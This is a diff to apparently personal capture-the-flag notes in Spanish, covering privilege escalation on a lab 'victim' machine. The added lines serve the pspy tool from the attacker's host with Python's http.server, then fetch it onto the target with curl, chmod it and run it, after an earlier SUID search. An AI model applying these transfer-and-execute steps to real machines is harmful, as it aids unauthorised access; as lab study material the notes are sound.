@@ -161,5 +161,20 @@ find / -perm -4000 -ls 2>/dev/null
 
 
 No encontramos nada que nos pueda ser útil así que probaremos con las tareas cron, usaremos la herramienta [[PSPY]]
+Nos descargamos la herramienta en nuestra maquina `https://github.com/DominicBreuker/pspy?tab=readme-ov-file`
+Y nos abrimos un servidor con Python
+```shell
+python3 -m http.server 80
+```
 
+Y en la maquina victima lo descargamos en `/tml`
+```shell
+curl -O http://10.10.15.158/pspy64
+```
 
+Le damos permisos de ejecucion
+```shell
+chmod +x pspy64
+```
+
+Y lo ejecutamos
